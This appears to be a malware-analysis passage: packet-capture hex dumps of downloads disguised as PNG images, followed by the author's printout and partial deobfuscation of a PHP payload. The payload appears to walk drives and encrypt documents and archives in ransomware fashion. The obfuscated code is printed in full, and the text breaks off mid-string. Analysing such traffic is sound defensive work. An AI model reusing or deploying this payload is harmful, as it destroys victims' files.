         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00                                             ...
    TCP Flow:[172.16.1.126:49158:6:184.107.174.122:80] pkts:643 matchs with (0x14b3be0)Regex [experimental0]
         48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d         HTTP/1.1 200 OK.
         0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68 3a         .Content-Length:
         20 31 34 31 37 32 31 36 0d 0a 43 6f 6e 74 65 6e          1417216..Conten
         74 2d 54 79 70 65 3a 20 69 6d 61 67 65 2f 70 6e         t-Type: image/pn
         67 0d 0a 53 65 72 76 65 72 3a 20 4d 69 63 72 6f         g..Server: Micro
         73 6f 66 74 2d 49 49 53 2f 37 2e 35 0d 0a 58 2d         soft-IIS/7.5..X-
         50 6f 77 65 72 65 64 2d 42 79 3a 20 50 48 50 2f         Powered-By: PHP/
         35 2e 34 2e 31 34 0d 0a 43 6f 6e 74 65 6e 74 2d         5.4.14..Content-
         44 69 73 70 6f 73 69 74 69 6f 6e 3a 20 61 74 74         Disposition: att
         61 63 68 6d 65 6e 74 3b 20 66 69 6c 65 6e 61 6d         achment; filenam
         65 3d 36 62 37 34 65 2e 70 6e 67 0d 0a 58 2d 50         e=6b74e.png..X-P
         6f 77 65 72 65 64 2d 42 79 3a 20 41 53 50 2e 4e         owered-By: ASP.N
         45 54 0d 0a 44 61 74 65 3a 20 57 65 64 2c 20 30         ET..Date: Wed, 0
         36 20 4a 75 6c 20 32 30 31 36 20 30 30 3a 31 33         6 Jul 2016 00:13
         3a 34 34 20 47 4d 54 0d 0a 0d 0a 4d 5a 90 00 03         :44 GMT....MZ...
         00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00         ................
         00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00         ...@............
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 f8 00 00 00 0e 1f ba 0e 00         ................
         b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72         ...!..L.!This pr
         6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20         ogram cannot be 
         72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e         run in DOS mode.
         0d 0d 0a 24 00 00 00 00 00 00 00 ff 90 b5 04 bb         ...$............
         f1 db 57 bb f1 db 57 bb f1 db 57 c0 ed d7 57 a5         ..W...W...W...W.
         f1 db 57 38 ed d5 57 bf f1 db 57 8d d7 d1 57 b0         ..W8..W...W...W.
         f1 db 57 3c ed d9 57 94 f1 db 57 35 f9 84 57 be         ..W<..W...W5..W.
         f1 db 57 38 f9 86 57 b6 f1 db 57 bb f1 da 57 92         ..W8..W...W...W.
         f0 db 57 53 ee d1 57 ba f0 db 57 03 f7 dd 57 ba         ..WS..W...W...W.
         f1 db 57 53 ee df 57 b8 f1 db 57 52 69 63 68 bb         ..WS..W...WRich.
         f1 db 57 00 00 00 00 00 00 00 00 00 00 00 00 00         ..W.............
         00 00 00 50 45 00 00 4c 01 05 00 37 47 9b 48 00         ...PE..L...7G.H.
         00 00 00 00 00 00 00 e0 00 0e 21 0b 01 06 00 00         ..........!.....
         30 10 00 00 10 06 00 00 00 00 00 15 3e 10 00 00         0...........>...
         10 00 00 00 40 10 00 00 00 00 10 00 10 00 00 00         ....@...........
         10 00 00 04 00 00 00 04 00 00 00 04 00 00 00 00         ................
         00 00 00 00 50 16 00 00 10 00 00 00 00 00 00 02         ....P...........
         00 00 00 00 00 10 00 00 10 00 00 00 00 10 00 00         ................
         10 00 00 00 00 00 00 10 00 00 00 40 94 11 00 60         ...........@...`
         5f 00 00 48 81 11 00 b4 00 00 00 00 70 15 00 00         _..H........p...
         04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 80 15 00 d8 bd 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 40 10 00 50         ............@..P
         05 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 2e 74 65 78 74         ............text
         00 00 00 e6 2e 10 00 00 10 00 00 00 30 10 00 00         ............0...
         10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20         ............... 
         00 00 60 2e 72 64 61 74 61 00 00 a0 b3 01 00 00         ..`.rdata.......
         40 10 00 00 c0 01 00 00 40 10 00 00 00 00 00 00         @.......@.......
         00 00 00 00 00 00 00 40 00 00 40 2e 64 61 74 61         .......@..@.data
         00 00 00 e8 6f 03 00 00 00 12 00 00 c0 02 00 00         ....o...........
         00 12 00 00 00 00 00 00 00 00 00 00 00 00 00 40         ...............@
         00 00 c0 2e 72 73 72 63 00 00 00 00 04 00 00 00         ....rsrc........
         70 15 00 00 10 00 00 00 c0 14 00 00 00 00 00 00         p...............
         00 00 00 00 00 00 00 40 00 00 40 2e 72 65 6c 6f         .......@..@.relo
         63 00 00 68 c7 00 00 00 80 15 00 00 d0 00 00 00         c..h............
         d0 14 00 00 00 00 00 00 00 00 00 00 00 00 00 40         ...............@
         00 00 42 00 00 00 00 00 00 00 00 00 00 00 00 00         ..B.............
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00                                             ...
    TCP Flow:[172.16.1.126:49158:6:184.107.174.122:80] pkts:2585 matchs with (0x14b3be0)Regex [experimental0]
         48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d         HTTP/1.1 200 OK.
         0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68 3a         .Content-Length:
         20 37 30 39 36 0d 0a 43 6f 6e 74 65 6e 74 2d 54          7096..Content-T
         79 70 65 3a 20 69 6d 61 67 65 2f 70 6e 67 0d 0a         ype: image/png..
         53 65 72 76 65 72 3a 20 4d 69 63 72 6f 73 6f 66         Server: Microsof
         74 2d 49 49 53 2f 37 2e 35 0d 0a 58 2d 50 6f 77         t-IIS/7.5..X-Pow
         65 72 65 64 2d 42 79 3a 20 50 48 50 2f 35 2e 34         ered-By: PHP/5.4
         2e 31 34 0d 0a 43 6f 6e 74 65 6e 74 2d 44 69 73         .14..Content-Dis
         70 6f 73 69 74 69 6f 6e 3a 20 61 74 74 61 63 68         position: attach
         6d 65 6e 74 3b 20 66 69 6c 65 6e 61 6d 65 3d 37         ment; filename=7
         33 30 32 64 2e 70 6e 67 0d 0a 58 2d 50 6f 77 65         302d.png..X-Powe
         72 65 64 2d 42 79 3a 20 41 53 50 2e 4e 45 54 0d         red-By: ASP.NET.
         0a 44 61 74 65 3a 20 57 65 64 2c 20 30 36 20 4a         .Date: Wed, 06 J
         75 6c 20 32 30 31 36 20 30 30 3a 31 33 3a 34 38         ul 2016 00:13:48
         20 47 4d 54 0d 0a 0d 0a 3c 3f 70 68 70 20 24 6f          GMT....<?php $o
         34 34 38 3d 22 70 72 65 67 5f 72 22 2e 63 68 72         448="preg_r".chr
         28 31 30 31 29 2e 22 70 6c 22 2e 63 68 72 28 39         (101)."pl".chr(9
         37 29 2e 63 68 72 28 39 39 29 2e 22 65 22 3b 24         7).chr(99)."e";$
         78 34 33 38 3d 22 65 76 22 2e 63 68 72 28 39 37         x438="ev".chr(97
         29 2e 63 68 72 28 31 30 38 29 2e 63 68 72 28 34         ).chr(108).chr(4
         30 29 2e 22 62 61 73 65 36 34 22 2e 63 68 72 28         0)."base64".chr(
         39 35 29 2e 22 64 22 2e 63 68 72 28 31 30 31 29         95)."d".chr(101)
         2e 22 63 6f 64 65 28 22 2e 63 68 72 28 33 34 29         ."code(".chr(34)
         2e 22 63 32 56 30 58 33 52 70 22 2e 63 68 72 28         ."c2V0X3Rp".chr(
         39 38 29 2e 22 57 22 2e 63 68 72 28 38 36 29 2e         98)."W".chr(86).
         22 66 62 22 2e 63 68 72 28 37 31 29 2e 22 6c 74         "fb".chr(71)."lt
         61 22 2e 63 68 72 28 38 38 29 2e 22 51 6f 4d 22         a".chr(88)."QoM"
         2e 63 68 72 28 36 37 29 2e 22 6b 37 44 22 2e 63         .chr(67)."k7D".c
         68 72 28 38 31 29 2e 22 6f 4e 43 6d 5a 76 63 22         hr(81)."oNCmZvc"
         2e 63 68 72 28 31 30 35 29 2e 63 68 72 28 31 30         .chr(105).chr(10
         33 29 2e 22 6b 61 22 2e 63 68 72 28 38 34 29 2e         3)."ka".chr(84).
         22 30 22 2e 63 68 72 28 35 30 29 2e 22 4e 7a 73         "0".chr(50)."Nzs
         6b 61 54 77 39 4f 54 41 37 4a 47 22 2e 63 68 72         kaTw9OTA7JG".chr
         28 31 30 37 29 2e 22 72 22 2e 63 68 72 28 37 35         (107)."r".chr(75
         29 2e 22 79 6b 67 61 57 59 22 2e 63 68 72 28 31         )."ykgaWY".chr(1
         31 31 29 2e 22 51 22 2e 63 68 72 28 37 31 29 2e         11)."Q".chr(71).
         63 68 72 28 31 30 38 29 2e 63 68 72 28 31 32 32         chr(108).chr(122
         29 2e 22 58 22 2e 63 68 72 28 35 30 29 2e 22 52         )."X".chr(50)."R
         22 2e 63 68 72 28 31 31 32 29 2e 22 63 22 2e 63         ".chr(112)."c".c
         68 72 28 31 30 35 29 2e 22 68 6a 61 48 22 2e 63         hr(105)."hjaH".c
         68 72 28 37 33 29 2e 22 6f 4a 47 6b 70 4c 69 63         hr(73)."oJGkpLic
         36 22 2e 63 68 72 28 37 34 29 2e 22 79 6b 22 2e         6".chr(74)."yk".
         63 68 72 28 31 31 32 29 2e 22 49 46 22 2e 63 68         chr(112)."IF".ch
         72 28 38 32 29 2e 22 79 5a 57 22 2e 63 68 72 28         r(82)."yZW".chr(
         38 35 29 2e 22 6f 59 22 2e 63 68 72 28 35 30 29         85)."oY".chr(50)
         2e 22 68 79 4b 43 52 70 4b 53 34 6e 4f 69 22 2e         ."hyKCRpKS4nOi".
         63 68 72 28 39 39 29 2e 22 70 4f 77 22 2e 63 68         chr(99)."pOw".ch
         72 28 34 38 29 2e 22 4b 22 2e 63 68 72 28 36 38         r(48)."K".chr(68
         29 2e 22 51 22 2e 63 68 72 28 31 31 32 29 2e 22         )."Q".chr(112)."
         6d 22 2e 63 68 72 28 31 30 30 29 2e 22 57 35 6a         m".chr(100)."W5j
         22 2e 63 68 72 28 31 30 30 29 2e 22 47 6c 76 22         ".chr(100)."Glv"
         2e 63 68 72 28 39 38 29 2e 22 69 42 22 2e 63 68         .chr(98)."iB".ch
         72 28 38 35 29 2e 22 63 6d 56 6c 4b 43 52 77 4b         r(85)."cmVlKCRwK
         51 30 4b 65 22 2e 63 68 72 28 31 31 39 29 2e 22         Q0Ke".chr(119)."
         30 4b 43 53 52 68 50 22 2e 63 68 72 28 38 33 29         0KCSRhP".chr(83)
         2e 22 64 6c 4a 22 2e 63 68 72 28 31 32 32 29 2e         ."dlJ".chr(122).
         22 73 4e 22 2e 63 68 72 28 36 37 29 2e 22 67 22         "sN".chr(67)."g"
         2e 63 68 72 28 31 30 37 29 2e 22 6b 61 7a 31 69         .chr(107)."kaz1i
         59 58 4e 6c 4e 6a 22 2e 63 68 72 28 38 32 29 2e         YXNlNj".chr(82).
         22 66 22 2e 63 68 72 28 39 30 29 2e 22 47 56 6a         "f".chr(90)."GVj
         22 2e 63 68 72 28 39 38 29 2e 22 32 52 6c 4b 43         ".chr(98)."2RlKC
         22 2e 63 68 72 28 31 30 30 29 2e 22 4e 22 2e 63         ".chr(100)."N".c
         68 72 28 38 36 29 2e 22 30 74 55 57 6b 70 69 53         hr(86)."0tUWkpiS
         58 70 43 51 6c 22 2e 63 68 72 28 38 36 29 2e 22         XpCQl".chr(86)."
         75 51 55 35 78 4c 32 22 2e 63 68 72 28 34 39 29         uQU5xL2".chr(49)
         2e 22 55 53 32 31 22 2e 63 68 72 28 37 39 29 2e         ."US21".chr(79).
         22 64 32 22 2e 63 68 72 28 31 30 30 29 2e 22 69         "d2".chr(100)."i
         4f 47 64 22 2e 63 68 72 28 31 31 31 29 2e 22 64         OGd".chr(111)."d
         31 42 6e 64 7a 68 22 2e 63 68 72 28 37 32 29 2e         1Bndzh".chr(72).
         22 52 46 46 56 63 57 59 34 53 22 2e 63 68 72 28         "RFFVcWY4S".chr(
         31 30 39 29 2e 22 78 70 53 33 42 42 5a 48 22 2e         109)."xpS3BBZH".
         63 68 72 28 37 30 29 2e 22 7a 51 22 2e 63 68 72         chr(70)."zQ".chr
         28 34 38 29 2e 22 4e 52 54 6d 39 51 22 2e 63 68         (48)."NRTm9Q".ch
         72 28 38 35 29 2e 63 68 72 28 38 33 29 2e 22 74         r(85).chr(83)."t
         59 52 47 35 22 2e 63 68 72 28 31 30 36 29 2e 22         YRG5".chr(106)."
         54 6d 4d 72 65 22 2e 63 68 72 28 38 35 29 2e 22         TmMre".chr(85)."
         4a 43 22 2e 63 68 72 28 38 37 29 2e 22 54 22 2e         JC".chr(87)."T".
         63 68 72 28 38 36 29 2e 22 46 59 22 2e 63 68 72         chr(86)."FY".chr
         28 38 37 29 2e 22 39 75 22 2e 63 68 72 28 38 31         (87)."9u".chr(81
         29 2e 63 68 72 28 31 30 37 29 2e 22 4e 46 22 2e         ).chr(107)."NF".
         63 68 72 28 39 38 29 2e 22 46 42 57 56 30 22 2e         chr(98)."FBWV0".
         63 68 72 28 31 30 37 29 2e 22 7a 63 6c 4a 79 54         chr(107)."zclJyT
         7a 52 33 53 22 2e 63 68 72 28 36 38 29 2e 22 46         zR3S".chr(68)."F
         22 2e 63 68 72 28 31 31 32 29 2e 63 68 72 28 38         ".chr(112).chr(8
         35 29 2e 63 68 72 28 31 30 38 29 2e 22 6c 4e 55         5).chr(108)."lNU
         57 39 45 4d 32 4a 6b 53 30 22 2e 63 68 72 28 31         W9EM2JkS0".chr(1
         30 38 29 2e 22 36 64 7a 22 2e 63 68 72 28 39 30         08)."6dz".chr(90
         29 2e 22 44 51 6c 6c 4c 53 54 63 77 55 57 4a 5a         )."DQllLSTcwUWJZ
         22 2e 63 68 72 28 39 39 29 2e 22 6b 22 2e 63 68         ".chr(99)."k".ch
         72 28 34 39 29 2e 22 4b 22 2e 63 68 72 28 39 30         r(49)."K".chr(90
         29 2e 22 30 45 35 61 30 4e 22 2e 63 68 72 28 37         )."0E5a0N".chr(7
         36 29 2e 22                                             6).
    PacketDispatcher(0x131ed10) statistics
        Connected to Lan network stack
        Total packets:                9130
        Total bytes:               6254270
    RegexManager(0x14b3b10) statistics
        Regex:experimental0 matches:5

    Exiting process

So the first 4 downloads shows that in reality they are download EXE files, and the last download is downloading
some type of obfuscated php code.

.. code:: php

    <?php $o448="preg_r".chr(101)."pl".chr(97).chr(99)."e";$x438="ev".chr(97).chr(108).chr(40)."base64".chr(95)."d".chr(101)."code(".chr(34)."c2V0X3Rp".chr(98)."W".chr(86)."fb".chr(71)."lta".chr(88)."QoM".chr(67)."k7D".chr(81)."oNCmZvc".chr(105).chr(103)."ka".chr(84)."0".chr(50)."NzskaTw9OTA7JG".chr(107)."r".chr(75)."ykgaWY".chr(111)."Q".chr(71).chr(108).chr(122)."X".chr(50)."R".chr(112)."c".chr(105)."hjaH".chr(73)."oJGkpLic6".chr(74)."yk".chr(112)."IF".chr(82)."yZW".chr(85)."oY".chr(50)."hyKCRpKS4nOi".chr(99)."pOw".chr(48)."K".chr(68)."Q".chr(112)."m".chr(100)."W5j".chr(100)."Glv".chr(98)."iB".chr(85)."cmVlKCRwKQ0Ke".chr(119)."0KCSRhP".chr(83)."dlJ".chr(122)."sN".chr(67)."g".chr(107)."kaz1iYXNlNj".chr(82)."f".chr(90)."GVj".chr(98)."2RlKC".chr(100)."N".chr(86)."0tUWkpiSXpCQl".chr(86)."uQU5xL2".chr(49)."US21".chr(79)."d2".chr(100)."iOGd".chr(111)."d1Bndzh".chr(72)."RFFVcWY4S".chr(109)."xpS3BBZH".chr(70)."zQ".chr(48)."NRTm9Q".chr(85).chr(83)."tYRG5".chr(106)."TmMre".chr(85)."JC".chr(87)."T".chr(86)."FY".chr(87)."9u".chr(81).chr(107)."NF".chr(98)."FBWV0".chr(107)."zclJyTzR3S".chr(68)."F".chr(112).chr(85).chr(108)."lNUW9EM2JkS0".chr(108)."6dz".chr(90)."DQllLSTcwUWJZ".chr(99)."k".chr(49)."K".chr(90)."0E5a0N".chr(76)."U".chr(85)."pMa3l6YWhMR0".chr(116)."Z".chr(74).chr(121)."k".chr(55)."D".chr(81)."oJ".chr(74)."HM9Y".chr(50)."hy".chr(75)."DkyKTsNC".chr(103)."0KCWlmKHByZ".chr(87)."dfbWF".chr(48)."Y2".chr(103)."oJy8nLiRzLiRzLicod2lub".chr(110)."R8".chr(89)."m9vdHxzeXN0ZW18d".chr(50)."luZG93c3x0bXB8dG".chr(86)."tcHxwcm9ncm".chr(70)."tfGFwcGRhdGF8YX".chr(66)."wbG".chr(108)."jYX".chr(82).chr(112).chr(98)."258".chr(99)."m9hb".chr(87)."luZ".chr(51)."xtc29".chr(109)."Zm".chr(108).chr(106)."ZXx0".chr(90)."W1wb3Jh".chr(99).chr(110)."l8Y2FjaGUpL".chr(50)."knLCRw".chr(75)."S".chr(66)."8fCBwc".chr(109).chr(86)."nX21".chr(104)."dGNoKC".chr(99)."vc".chr(109)."VjeWNsZ".chr(83)."9pJ".chr(121)."wkcCkpIHJ".chr(108)."dH".chr(86)."y".chr(98).chr(106)."sN".chr(67).chr(103)."0".chr(75)."CSRk".chr(99)."D1".chr(65)."b3".chr(66)."lb".chr(109).chr(82)."pcigkcCk7".chr(68)."QoN".chr(67)."glpZi".chr(103)."kZHA".chr(57)."PT1mYWxz".chr(90)."SkgcmV0dXJuOw0KDQo".chr(74).chr(100).chr(50)."hpbGUoJG89QHJl".chr(89)."WRkaX".chr(73)."oJ".chr(71)."Rw".chr(75)."Sk".chr(103)."aWYoJG8hPScuJyYmJ".chr(71)."8".chr(104)."P".chr(83).chr(99)."uLi".chr(99)."pD".chr(81)."oJew0".chr(75)."C".chr(81).chr(108)."p".chr(90).chr(105)."Ao".chr(81)."Glz".chr(88)."2Rp".chr(99)."igkc".chr(67)."4k".chr(99).chr(121)."4k".chr(98)."ykpDQoJC".chr(88)."sN".chr(67)."gk".chr(74)."C".chr(86)."R".chr(121)."Z".chr(87)."U".chr(111)."J".chr(72).chr(65)."u".chr(74)."HM".chr(117)."JG8pOw".chr(48)."K".chr(67)."Q".chr(108)."9DQoJ".chr(67).chr(87)."V".chr(115).chr(99)."2Vp".chr(90)."iAoJGE9PSdlJyYmcHJlZ19tYX".chr(82)."ja".chr(67).chr(103)."nL1".chr(115)."uXS".chr(104)."6aXB8cmFyfHIwMHxy".chr(77)."DF".chr(56)."cjAy".chr(102)."HIwM".chr(51)."w3enx0YXJ8Z3".chr(112)."8Z".chr(51).chr(112).chr(112).chr(99)."H".chr(120)."hcmN8YXJqf".chr(71).chr(74)."6fG".chr(74)."6Mn".chr(120)."i".chr(101)."mF".chr(56)."YnppcHxie".chr(109)."l".chr(119)."MnxpY".chr(50)."V".chr(56).chr(101)."GxzfHh".chr(115)."c3h8Z".chr(71)."9jfGRvY3h".chr(56).chr(99)."GRmfGRqdnV".chr(56).chr(90)."m".chr(73)."yf".chr(72)."J0Znx".chr(119)."cHR8".chr(99)."HB0e".chr(72).chr(120)."w".chr(99)."HN8c3hpf".chr(71)."9kbXx".chr(118)."ZHR8bXBwf".chr(72)."Nza".chr(72).chr(120).chr(119)."d".chr(87)."J8".chr(90)."3Bn".chr(102).chr(72).chr(66).chr(110).chr(99)."HxrZGJ".chr(56)."a2Rie".chr(72)."x".chr(104)."b".chr(72)."N8YXVwfGN".chr(119)."cn".chr(120)."ucH".chr(74)."8Y3BwfGJhc3xhc2".chr(49)."8".chr(89).chr(51).chr(78)."8cGhwfHB".chr(104)."c3xjbG".chr(70)."zc3xweXxwb".chr(72)."xof".chr(72)."ZifHZjcHJvanx2Yn".chr(66).chr(121)."b2".chr(112).chr(56)."amF2YXxiYWt8Ym".chr(70)."ja3V".chr(119).chr(102)."G1kYnxhY2NkYnx".chr(116)."ZGZ8b2".chr(82).chr(105)."fHdkYnxjc".chr(51)."Z8dHN".chr(50)."fHNxb".chr(72)."xwc".chr(50)."R8Z".chr(88).chr(66)."zfGN".chr(107)."cnxjcH".chr(82).chr(56)."a".chr(87).chr(53)."kZHxk".chr(100)."2d8YWl8c3ZnfG1heHxza3B8".chr(99)."2N".chr(104)."ZHxjYWR".chr(56).chr(77).chr(50)."RzfGJ".chr(115).chr(90)."W5kf".chr(71)."x3b3".chr(120)."sd3N8bWJ8c2xk".chr(90)."HJ3".chr(102)."HN".chr(115)."ZGFz".chr(98).chr(88)."x".chr(122)."bGRwc".chr(110)."R".chr(56)."dT".chr(78)."kfGpwZ3xqc".chr(71)."VnfH".chr(82)."pZmZ8".chr(100)."Glm".chr(102)."HJh".chr(100)."3xh".chr(100)."m".chr(108)."8".chr(98)."XBnfG1w".chr(78)."HxtNH".chr(90)."8bXBl".chr(90)."3xtcGV8d21mf".chr(72)."dtdnx".chr(50)."ZWd8".chr(98)."W92fD".chr(78)."ncHxmb".chr(72)."Z".chr(56).chr(98)."Wt2f".chr(72)."ZvYnx".chr(121)."bXxt".chr(99)."DN8d2".chr(70).chr(50)."fG".chr(70).chr(122)."Znx3".chr(98)."WF8b".chr(84)."N1".chr(102)."G1pZGl8b2dn".chr(102)."G1pZH".chr(120).chr(50)."ZGl".chr(56)."dm1".chr(107)."a".chr(51)."x2aGR8".chr(90)."HNr".chr(102)."GltZ3".chr(120)."pc28pJ".chr(67)."9".chr(112)."J".chr(121)."w".chr(107).chr(98)."ykgfHwgJGE9PSdkJyYmcHJl".chr(90)."19tYX".chr(82).chr(106).chr(97).chr(67)."gnL1suXShjcnlwdG".chr(86).chr(107)."K".chr(83)."Q".chr(118)."a".chr(83)."c".chr(115).chr(74)."G8pKQ0KCQl".chr(55)."DQ".chr(111)."JCQkkZn".chr(65)."9Q".chr(71)."ZvcG".chr(86)."uKCRwLiR".chr(122)."LiRvLC".chr(100)."yK".chr(121)."c".chr(112)."O".chr(119)."0K".chr(67)."QkJaWYgKCRmcCE9".chr(80)."WZ".chr(104)."bH".chr(78)."l".chr(75).chr(81)."0".chr(75)."CQkJew".chr(48)."KCQkJCS".chr(82)."4PUB".chr(109)."cmVhZ".chr(67)."gkZnAsMTAyN".chr(67)."k7DQoJCQkJ".chr(90)."m".chr(57)."yKCRpPTA".chr(55)."JG".chr(107).chr(56).chr(99)."3".chr(82)."yb".chr(71)."VuKCR".chr(52)."KTskaS".chr(115)."rKSR4WyRpXT1jaHIob3JkKCR4".chr(87)."yR".chr(112)."XSleb3Jk".chr(75)."C".chr(82)."rWyRpJXN".chr(48).chr(99)."mxlbigkayldKSk7".chr(68)."Q".chr(111)."J".chr(67)."Q".chr(107)."JQG".chr(90)."zZWV".chr(114).chr(75)."C".chr(82)."mc".chr(67)."wwKTsNCgkJCQl".chr(65)."Zndy".chr(97)."XR".chr(108)."KCRmcCwk".chr(101)."C".chr(107)."7DQoJ".chr(67)."Qk".chr(74)."Q".chr(71).chr(90)."jbG9zZS".chr(103).chr(107)."ZnApOw".chr(48)."K".chr(68)."Q".chr(111)."JCQkJaWYoJGE9PS".chr(100)."lJ".chr(121)."k".chr(78)."CgkJCQl7DQo".chr(74)."CQkJCUB".chr(121)."ZW".chr(53)."hb".chr(87)."Uo".chr(74)."H".chr(65)."uJ".chr(72)."Mu".chr(74)."G8s".chr(73)."C".chr(82).chr(119)."LiR".chr(122)."LiRvL".chr(105)."cu".chr(89)."3".chr(74)."5cH".chr(82)."lZCc".chr(112)."Ow0KCQk".chr(74)."C".chr(88)."0".chr(78).chr(67)."gkJCQll".chr(98)."HNlDQoJCQk".chr(74)."ew0".chr(75)."C".chr(81).chr(107)."J".chr(67).chr(81)."lAc".chr(109)."Vu".chr(89)."W1lKC".chr(82)."wLiRzLiR".chr(118)."LCBw".chr(99)."m".chr(86)."nX3J".chr(108).chr(99).chr(71).chr(120)."hY2Uo".chr(74)."y9bL".chr(108)."1jc".chr(110)."lw".chr(100)."GV".chr(107)."JC8n".chr(76).chr(67)."AnJywgJHAuJHMuJG".chr(56).chr(112)."K".chr(84).chr(115)."N".chr(67)."gk".chr(74)."CQl9DQoJCQl9DQoJCX0NCgl9DQoNC".chr(103)."lAY2".chr(120)."vc2VkaXIoJ".chr(71).chr(82)."wKTsNCn0=".chr(34)."));";$s109="/".chr(56)."b3822".chr(49)."e975e7".chr(97).chr(57)."e".chr(54)."ef3c6ed6de0".chr(97)."f".chr(53)."f/e";preg_replace($s109,$x438,"8b38221".chr(101)."975".chr(101)."7a9e6ef3c6ed6de0".chr(97).chr(102)."5f"); ?>

I wrote a basic python script that changes the chr(NUMBER) to their corresponding value in assci and here are the results

.. code:: php

    <?php $o448="preg_replace";$x438="eval(base64_decode("c2V0X3RpbWVfbGltaXQoMCk7DQoNCmZvcigkaT02NzskaTw9OTA7JGkrKykgaWYoQGlzX2RpcihjaHIoJGkpLic6JykpIFRyZWUoY2hyKCRpKS4nOicpOw0KDQpmdW5jdGlvbiBUcmVlKCRwKQ0Kew0KCSRhPSdlJzsNCgkkaz1iYXNlNjRfZGVjb2RlKCdNV0tUWkpiSXpCQlVuQU5xL21US21Od2diOGdod1BndzhHRFFVcWY4SmxpS3BBZHFzQ0NRTm9QUStYRG5jTmMreUJCWTVFYW9uQkNFbFBWV0kzclJyTzR3SDFpUllNUW9EM2JkS0l6dzZDQllLSTcwUWJZck1KZ0E5a0NLUUpMa3l6YWhMR0tZJyk7DQoJJHM9Y2hyKDkyKTsNCg0KCWlmKHByZWdfbWF0Y2goJy8nLiRzLiRzLicod2lubnR8Ym9vdHxzeXN0ZW18d2luZG93c3x0bXB8dGVtcHxwcm9ncmFtfGFwcGRhdGF8YXBwbGljYXRpb258cm9hbWluZ3xtc29mZmljZXx0ZW1wb3Jhcnl8Y2FjaGUpL2knLCRwKSB8fCBwcmVnX21hdGNoKCcvcmVjeWNsZS9pJywkcCkpIHJldHVybjsNCg0KCSRkcD1Ab3BlbmRpcigkcCk7DQoNCglpZigkZHA9PT1mYWxzZSkgcmV0dXJuOw0KDQoJd2hpbGUoJG89QHJlYWRkaXIoJGRwKSkgaWYoJG8hPScuJyYmJG8hPScuLicpDQoJew0KCQlpZiAoQGlzX2RpcigkcC4kcy4kbykpDQoJCXsNCgkJCVRyZWUoJHAuJHMuJG8pOw0KCQl9DQoJCWVsc2VpZiAoJGE9PSdlJyYmcHJlZ19tYXRjaCgnL1suXSh6aXB8cmFyfHIwMHxyMDF8cjAyfHIwM3w3enx0YXJ8Z3p8Z3ppcHxhcmN8YXJqfGJ6fGJ6MnxiemF8YnppcHxiemlwMnxpY2V8eGxzfHhsc3h8ZG9jfGRvY3h8cGRmfGRqdnV8ZmIyfHJ0ZnxwcHR8cHB0eHxwcHN8c3hpfG9kbXxvZHR8bXBwfHNzaHxwdWJ8Z3BnfHBncHxrZGJ8a2RieHxhbHN8YXVwfGNwcnxucHJ8Y3BwfGJhc3xhc218Y3N8cGhwfHBhc3x